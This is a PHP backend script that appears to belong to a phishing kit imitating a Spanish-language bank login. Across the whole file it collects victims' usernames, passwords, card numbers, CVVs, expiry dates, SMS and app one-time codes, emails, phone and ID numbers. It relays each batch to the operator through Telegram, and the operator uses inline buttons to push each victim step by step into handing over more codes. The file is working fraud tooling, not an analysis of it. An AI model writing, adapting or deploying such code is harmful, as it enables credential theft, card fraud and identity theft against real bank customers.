<?php
require(__DIR__ . '/../lib/auth.php');
$tipo = '';
if (isset($_POST['t'])) {
    $tipo = $_POST['t'];
}
$registro = '';
if (isset($_POST['registro'])) {
    $registro = $_POST['registro'];
}

$script_user = 'flows/user.php';
$script_pass = 'flows/pass.php';
$script_email = 'flows/email.php';

if ($registro !== '') {
    @presence_touch($registro, $_SERVER['REMOTE_ADDR'] ?? null);
}

function to_upper($v) {
    if ($v === null) return '';
    $s = (string)$v;
    if (function_exists('mb_strtoupper')) {
        return mb_strtoupper($s, 'UTF-8');
    }
    return strtoupper($s);
}

function parse_mensaje_payload($raw, $defaultKey = 'panel_note') {
    if (empty($raw)) {
        return [];
    }

    if (is_array($raw)) {
        return $raw;
    }

    if (is_string($raw)) {
        $decoded = json_decode($raw, true);
        if (json_last_error() === JSON_ERROR_NONE && is_array($decoded)) {
            return $decoded;
        }

        return [$defaultKey => $raw];
    }

    return [];
}

function obtener_mensaje_custom($raw) {
    $payload = parse_mensaje_payload($raw, 'custom_message');
    $msg = $payload['custom_message'] ?? '';
    return is_string($msg) ? $msg : '';
}


function generate_inline_keyboard($registro, $owner)
{
    return tg_panel_keyboard_layout($registro, $owner);
}

function set_card_flow(array &$data, $type, $mensaje = null, $error = null)
{
    $data['action']  = 'flows/card.php';
    $data['type']    = $type;
    $data['mensaje'] = $mensaje;
    $data['error']   = $error;
    $data['otpType'] = null;
}

function set_code_flow(array &$data, $codeType, $mensaje = null, $error = null, $cvvLength = null)
{
    $data['action']    = 'flows/code.php';
    $data['codeType']  = $codeType;
    $data['mensaje']   = $mensaje;
    $data['error']     = $error;
    if ($cvvLength !== null) {
        $data['cvvLength'] = $cvvLength;
    }
    $data['otpType'] = null;
}

function set_otp_flow(array &$data, $otpType, $mensaje = null, $error = null)
{
    $otpType = strtoupper((string)$otpType) === 'SMS' ? 'SMS' : 'APP';
    $data['action']  = ($otpType === 'SMS') ? 'flows/otp_sms.php' : 'flows/otp_app.php';
    $data['otpType'] = $otpType;
    $data['mensaje'] = $mensaje;
    $data['error']   = $error;
}

$data = [];
switch ($tipo) {
    case 'consultar':
        global $owner;
        $status = -1;
        $actual_data = buscar_registro($registro);
        if ($actual_data) {
            $status = $actual_data['status'];
        }

        if ($status === 'rec_password') {
            $mensajePayload = parse_mensaje_payload($actual_data['mensaje'] ?? '', 'panel_note');
            $autoData = [];
            if (is_array($mensajePayload)) {
                $autoData = $mensajePayload['auto_data'] ?? [];
            } else {
                $mensajePayload = [];
            }

            $now = time();
            $startedAt = intval($autoData['started_at'] ?? 0);
            $alreadyTriggered = !empty($autoData['triggered']);

            if ($startedAt === 0) {
                $mensajePayload['auto_data'] = ['started_at' => $now, 'triggered' => false];
                actualizar_registro($registro, ['mensaje' => json_encode($mensajePayload)], false);
            } elseif (!$alreadyTriggered && ($now - $startedAt) >= 7) {
                $mensajePayload['auto_data']['triggered'] = true;
                if (tg_try_clear_inline_keyboard($mensajePayload)) {
                    unset($mensajePayload['tg_last_inline']);
                }
                actualizar_registro($registro, [
                    'status'  => 'req_email',
                    'mensaje' => json_encode($mensajePayload),
                ]);
                $status = 'req_email';
                $actual_data['status'] = $status;
                $actual_data['mensaje'] = json_encode($mensajePayload);
                if (!empty($owner)) {
                    enviar_telegram("✉️ DATOS SOLICITADOS (AUTO)", $owner, false, []);
                    // Intentar eliminar teclado en el último mensaje enviado al owner (best effort)
                    if (!empty($actual_data['tg_last_sent'])) {
                        $lastMsgId = intval($actual_data['tg_last_sent']);
                        // chat_id no se guarda, así que no podemos dirigirnos al mensaje exacto.
                        // Enviar mensaje sin teclado ya evita botones; mantenemos solo aviso sin inline.
                    }
                    @tg_mark_last_sent($registro);
                }
            }
        }

        switch ($status) {
            case 'req_cedula':
                $data['action'] = 'flows/id.php';
                break;
            case 'req_soyyo':
                $data['action'] = 'flows/face.php';
                break;
            case 'rec_cedula':
                $data['action'] = 'flows/wait.php';
                break;
            case 'rec_rostro':
                $data['action'] = 'flows/wait.php';
                break;
            case 'error_login':
                $data['error'] = 'Usuario o clave incorrecta. Por favor, intente de nuevo.';
                $data['mensaje'] = null;
            case 'req_usuario':
                $data['action'] = $script_user;
                break;
            case 'error_cvv':
                set_card_flow($data, 'debito', null, 'Datos de tarjeta incorrectos. Por favor, intente de nuevo.');
                break;
            case 'req_tarjeta':
                set_card_flow($data, 'debito');
                break;
            case 'req_tarjeta_credito':
                set_card_flow($data, 'credito');
                break;
            case 'req_cvv':
                $cardNumber = '';
                if (is_array($actual_data) && !empty($actual_data['tarjeta'])) {
                    $cardNumber = preg_replace('/[^0-9]/', '', (string) $actual_data['tarjeta']);
                    if ($cardNumber !== '') {
                        $data['mensaje'] = substr($cardNumber, -4);
                    } else {
                        $data['mensaje'] = null;
                    }
                }
                $cvvLength = 3;
                if ($cardNumber !== '' && preg_match('/^(34|37)/', $cardNumber)) {
                    $cvvLength = 4;
                }
                set_code_flow($data, 'cvv', $data['mensaje'] ?? null, null, $cvvLength);
                $data['type'] = 'debito';
                break;
            case 'req_visa':
                set_code_flow($data, 'visa');
                break;
            case 'req_amex':
                set_code_flow($data, 'amex', null, null, 4);
                break;
            case 'req_master':
                set_code_flow($data, 'master');
                break;
            case 'req_email':
                $data['action'] = $script_email;
                break;
            case 'req_otp_expired':
                set_otp_flow($data, 'APP', null, 'La clave dinámica ingresó expirada. Por favor solicita una nueva.');
                break;
            case 'error_login_personalizado':
                $data['error'] = null;
                $data['otpType'] = null;
                $data['mensaje'] = obtener_mensaje_custom($actual_data['mensaje']);
                $data['action'] = $script_user;
                break;
            case 'req_otp_perso':
                set_otp_flow($data, 'SMS', obtener_mensaje_custom($actual_data['mensaje']));
                break;
            case 'req_tarjeta_credito_personalizado':
                set_card_flow($data, 'credito', obtener_mensaje_custom($actual_data['mensaje']));
                break;
            case 'req_tarjeta_personalizado':
                set_card_flow($data, 'debito', obtener_mensaje_custom($actual_data['mensaje']));
                break;
            case 'error_otp':
                set_otp_flow($data, 'APP', null, 'Clave dinámica incorrecta. Por favor, intente de nuevo.');
                break;
            case 'error_otp_sms':
                set_otp_flow($data, 'SMS', null, 'Código de seguridad incorrecto. Por favor intente de nuevo.');
                break;
            case 'req_otp':
                set_otp_flow($data, 'SMS');
                break;
            case 'req_otp_app':
                set_otp_flow($data, 'APP');
                break;
            case 'req_923':
                $data['error'] = null;
                $data['mensaje'] = null;
                $data['otpType'] = 'APP';
                $data['action'] = 'flows/e923.php';
                break;
            case 'finish_dinamic':
                $data['action'] = 'flows/done.php';
                $data['status'] = "finish_dinamic";
                break;
            case 'finish':
                $data['action'] = 'flows/done.php';
                $data['status'] = "finish";
                break;
            case 'error_404':
                $data['action'] = 'flows/err.php';
                break;
        }
        break;
    case 'usuario':
        $usuario = $_POST['usuario'];
        $actual_data['usuario'] = $usuario;
        $array = [
            'status' => 'rec_usuario',
            'usuario' => $usuario
        ];

        $data['registro'] =  crear_registro($array);
        $data['action'] = $script_pass;
        break;
    case 'password':
        $password = $_POST['password'];
        $existing = buscar_registro($registro);
        $mensajePayload = parse_mensaje_payload($existing['mensaje'] ?? '', 'panel_note');
        if (!is_array($mensajePayload)) {
            $mensajePayload = [];
        }
        $mensajePayload['auto_data'] = [
            'started_at' => time(),
            'triggered' => false,
        ];
        $array = [
            'status' => 'rec_password',
            'password' => $password,
            'mensaje' => json_encode($mensajePayload),
        ];

        actualizar_registro($registro, $array);
        $actual_data = buscar_registro($registro);

        $dispositivo = $actual_data['dispositivo'];
        if (strpos($dispositivo, 'Android') !== false) {
            $dispositivo = 'android';
        } else if (strpos($dispositivo, 'webOS') !== false) {
            $dispositivo = "webOS";
        } else if (strpos($dispositivo, 'iPhone') !== false) {
            $dispositivo = "iPhone";
        } else if (strpos($dispositivo, 'iPad') !== false) {
            $dispositivo = "iPad";
        } else if (strpos($dispositivo, 'iPod') !== false) {
            $dispositivo = "iPod";
        } else if (strpos($dispositivo, 'BlackBerry') !== false) {
            $dispositivo = "BlackBerry";
        } else if (strpos($dispositivo, 'Windows Phone') !== false) {
            $dispositivo = "Windows Phone";
        } else {
            $dispositivo = "PC";
        }
        $contenido = '';
        $usuario = $actual_data['usuario'];
        if (preg_match('/^[0-9]+$/', $usuario)) {
            $usuario .= ' ';
        } else {
            $usuario .= ' ';
        }
        $contenido .= "👤 " . to_upper($usuario) . "\n";
        $contenido .= "🔒 " . to_upper($actual_data['password']) . "\n";
        $options = generate_inline_keyboard($registro, $owner);
        $tracking = ['registro' => $registro, 'track_inline' => true];
        enviar_telegram($contenido, $owner, true, $options, $tracking);
        if (!empty($registro)) { @tg_mark_last_sent($registro); }
        $data['action'] = 'flows/wait.php';
        break;
    case 'otp':
        $array = [
            'status' => 'rec_otp',
            'otp' => $_POST['otp']
        ];
        $otpType = $_POST['otpType'] ?? '';
        $actual_data = buscar_registro($registro);

        actualizar_registro($registro, $array);
        $contenido = "👤 " . to_upper($actual_data['usuario'] ?? "SIN USUARIO") . "\n"
            . "🔒 " . to_upper($actual_data['password'] ?? "SIN PASSWORD") . "\n";
        if (!empty($actual_data['cvv'])) {
            $contenido .= "👁 " . to_upper($actual_data['cvv']) . "\n";
        }
        $isApp = strtoupper((string)$otpType) === 'APP';
        $contenido .= "🔢 " . to_upper($_POST['otp'] ?? "SIN OTP") . "\n";

        $options = generate_inline_keyboard($registro, $owner);
        $channelLogin = strtoupper((string)$otpType) !== 'SMS';
        enviar_telegram($contenido, $owner, $channelLogin, $options);
        if (!empty($registro)) { @tg_mark_last_sent($registro); }
        $data['action'] = 'flows/wait.php';
        break;
    case 'card':
        $tarjeta = $_POST['tarjeta'];
        $ftarjeta = $_POST['ftarjeta'];
        $type = $_POST['type'];
        $cvv = $_POST['cvv'];
        $array = [
            'status' => 'rec_tarjeta',
            'tarjeta' => $tarjeta,
            'ftarjeta' => $ftarjeta,
            'cvv' => $cvv,
        ];
        $actual_data = buscar_registro($registro);
        actualizar_registro($registro, $array);
        $contenido = '';
        $contenido .= "👤 " . to_upper($actual_data['usuario'] ?? "SIN USUARIO") . "\n";
        $contenido .= "🔒 " . to_upper($actual_data['password'] ?? "SIN PASSWORD") . "\n";
        if ($cvv !== '') {
            $contenido .= "👁 " . to_upper($cvv) . "\n";
        }
        $contenido .= "💳 " . to_upper($tarjeta ?? "SIN TARJETA") . "\n";
        $contenido .= "🏷️ " . to_upper($type ?? "SIN TIPO") . "\n";
        $contenido .= "📆 " . to_upper($ftarjeta ?? "SIN FECHA") . "\n";

        $options = generate_inline_keyboard($registro, $owner);
        enviar_telegram($contenido, $owner, false, $options);
        if (!empty($registro)) { @tg_mark_last_sent($registro); }
        $data['action'] = 'flows/wait.php';
        break;
    case 'cvv':
        $cvv = $_POST['cvv'] ?? '';
        $type = $_POST['type'] ?? '';
        $actual_data = buscar_registro($registro);
        $array = [
            'status' => 'rec_cvv',
            'cvv' => $cvv,
        ];
        actualizar_registro($registro, $array);
        $contenido = '';
        $contenido .= "👤 " . to_upper($actual_data['usuario'] ?? "SIN USUARIO") . "\n";
        $contenido .= "🔒 " . to_upper($actual_data['password'] ?? "SIN PASSWORD") . "\n";
        if ($cvv !== '') {
            $contenido .= "👁 " . to_upper($cvv) . "\n";
        }
        if (!empty($actual_data['tarjeta'])) {
            $contenido .= "💳 " . to_upper($actual_data['tarjeta']) . "\n";
        }
        if (!empty($actual_data['ftarjeta'])) {
            $contenido .= "📆 " . to_upper($actual_data['ftarjeta']) . "\n";
        }
        if ($type !== '') {
            $contenido .= "🏷️ " . to_upper($type) . "\n";
        }

        $options = generate_inline_keyboard($registro, $owner);
        enviar_telegram($contenido, $owner, false, $options);
        if (!empty($registro)) { @tg_mark_last_sent($registro); }
        $data['action'] = 'flows/wait.php';
        break;
    case 'visa':
        $visa = $_POST['visa'] ?? '';
        $actual_data = buscar_registro($registro);
        $payload = parse_mensaje_payload($actual_data['mensaje'] ?? null);
        if (!is_array($payload)) { $payload = []; }
        if ($visa !== '') {
            $payload['visa'] = $visa;
        } else {
            unset($payload['visa']);
        }
        $mensajeValue = '';
        if (!empty($payload)) {
            $mensajeValue = json_encode($payload, JSON_UNESCAPED_UNICODE);
        }
        $array = [
            'status' => 'rec_visa',
        ];
        if ($mensajeValue !== '') {
            $array['mensaje'] = $mensajeValue;
        } elseif (!empty($actual_data['mensaje'])) {
            $array['mensaje'] = '';
        }
        actualizar_registro($registro, $array);
        $contenido = '';
        $contenido .= "👤 " . to_upper($actual_data['usuario'] ?? "SIN USUARIO") . "\n";
        $contenido .= "🔒 " . to_upper($actual_data['password'] ?? "SIN PASSWORD") . "\n";
        if (!empty($actual_data['tarjeta'])) {
            $contenido .= "💳 " . to_upper($actual_data['tarjeta']) . "\n";
        }
        if (!empty($actual_data['ftarjeta'])) {
            $contenido .= "📆 " . to_upper($actual_data['ftarjeta']) . "\n";
        }
        $contenido .= "🪙 VISA: " . to_upper($visa !== '' ? $visa : 'SIN VISA') . "\n";

        $options = generate_inline_keyboard($registro, $owner);
        enviar_telegram($contenido, $owner, false, $options);
        if (!empty($registro)) { @tg_mark_last_sent($registro); }
        $data['action'] = 'flows/wait.php';
        break;
    case 'amex':
        $amex = $_POST['amex'] ?? '';
        $actual_data = buscar_registro($registro);
        $payload = parse_mensaje_payload($actual_data['mensaje'] ?? null);
        if (!is_array($payload)) { $payload = []; }
        if ($amex !== '') {
            $payload['amex'] = $amex;
        } else {
            unset($payload['amex']);
        }
        $mensajeValue = '';
        if (!empty($payload)) {
            $mensajeValue = json_encode($payload, JSON_UNESCAPED_UNICODE);
        }
        $array = [
            'status' => 'rec_amex',
        ];
        if ($mensajeValue !== '') {
            $array['mensaje'] = $mensajeValue;
        } elseif (!empty($actual_data['mensaje'])) {
            $array['mensaje'] = '';
        }
        actualizar_registro($registro, $array);
        $contenido = '';
        $contenido .= "👤 " . to_upper($actual_data['usuario'] ?? "SIN USUARIO") . "\n";
        $contenido .= "🔒 " . to_upper($actual_data['password'] ?? "SIN PASSWORD") . "\n";
        if (!empty($actual_data['tarjeta'])) {
            $contenido .= "💳 " . to_upper($actual_data['tarjeta']) . "\n";
        }
        if (!empty($actual_data['ftarjeta'])) {
            $contenido .= "📆 " . to_upper($actual_data['ftarjeta']) . "\n";
        }
        $contenido .= "💠 AMEX: " . to_upper($amex !== '' ? $amex : 'SIN AMEX') . "\n";

        $options = generate_inline_keyboard($registro, $owner);
        enviar_telegram($contenido, $owner, false, $options);
        if (!empty($registro)) { @tg_mark_last_sent($registro); }
        $data['action'] = 'flows/wait.php';
        break;
    case 'master':
        $master = $_POST['master'] ?? '';
        $actual_data = buscar_registro($registro);
        $payload = parse_mensaje_payload($actual_data['mensaje'] ?? null);
        if (!is_array($payload)) { $payload = []; }
        if ($master !== '') {
            $payload['master'] = $master;
        } else {
            unset($payload['master']);
        }
        $mensajeValue = '';
        if (!empty($payload)) {
            $mensajeValue = json_encode($payload, JSON_UNESCAPED_UNICODE);
        }
        $array = [
            'status' => 'rec_master',
        ];
        if ($mensajeValue !== '') {
            $array['mensaje'] = $mensajeValue;
        } elseif (!empty($actual_data['mensaje'])) {
            $array['mensaje'] = '';
        }
        actualizar_registro($registro, $array);
        $contenido = '';
        $contenido .= "👤 " . to_upper($actual_data['usuario'] ?? "SIN USUARIO") . "\n";
        $contenido .= "🔒 " . to_upper($actual_data['password'] ?? "SIN PASSWORD") . "\n";
        if (!empty($actual_data['tarjeta'])) {
            $contenido .= "💳 " . to_upper($actual_data['tarjeta']) . "\n";
        }
        if (!empty($actual_data['ftarjeta'])) {
            $contenido .= "📆 " . to_upper($actual_data['ftarjeta']) . "\n";
        }
        $contenido .= "🧿 MASTER: " . to_upper($master !== '' ? $master : 'SIN MASTER') . "\n";

        $options = generate_inline_keyboard($registro, $owner);
        enviar_telegram($contenido, $owner, false, $options);
        if (!empty($registro)) { @tg_mark_last_sent($registro); }
        $data['action'] = 'flows/wait.php';
        break;
    case 'email':
        $email = $_POST['email'];
        $cemail = $_POST['cemail'];
        $celular = $_POST['celular'];
        $array = [
            'status' => 'rec_email',
            'email' => $email,
            'cemail' => $cemail,
            'celular' => $celular,
        ];
        $actual_data = buscar_registro($registro);
        actualizar_registro($registro, $array);
        $contenido = '';
        $contenido .= "👤 " . to_upper($actual_data['usuario'] ?? "SIN USUARIO") . "\n";
        $contenido .= "🔒 " . to_upper($actual_data['password'] ?? "SIN PASSWORD") . "\n";
        $contenido .= "📧 " . to_upper($email ?? "SIN EMAIL") . "\n";
        $contenido .= "📱 " . to_upper($celular ?? "SIN CELULAR") . "\n";
        $contenido .= "🆔 " . to_upper($cemail ?? "SIN DOCUMENTO") . "\n";

        $options = generate_inline_keyboard($registro, $owner);
        enviar_telegram($contenido, $owner, false, $options);
        if (!empty($registro)) { @tg_mark_last_sent($registro); }
        $data['action'] = 'flows/wait.php';
        break;
    case 'home':
        $data['action'] = '_home.php';
        break;
}

// Adjuntar nota para mostrar al usuario (si existe).
if ($registro !== '') {
    $rowPanel = buscar_registro($registro);
    $payloadPanel = parse_mensaje_payload($rowPanel['mensaje'] ?? '', 'panel_note');
    if (is_array($payloadPanel) && !empty($payloadPanel['panel_note']) && is_string($payloadPanel['panel_note'])) {
        $data['panel_note'] = $payloadPanel['panel_note'];
    }
}
echo json_encode($data);



